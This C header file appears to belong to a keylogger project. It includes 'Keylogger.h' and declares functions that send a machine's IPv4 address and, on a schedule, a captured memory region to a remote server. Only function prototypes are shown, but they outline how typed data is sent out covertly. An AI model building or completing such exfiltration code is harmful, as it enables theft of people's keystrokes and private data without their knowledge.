#ifndef TRANSMISSION_H
#define TRANSMISSION_H
#include "Keylogger.h"

int sendIpv4ToServer(const char* serverUrl, const char* ipv4Address);
void sendToServerPeriodically(MemoryRegion* memRegion, const char* serverUrl);

#endif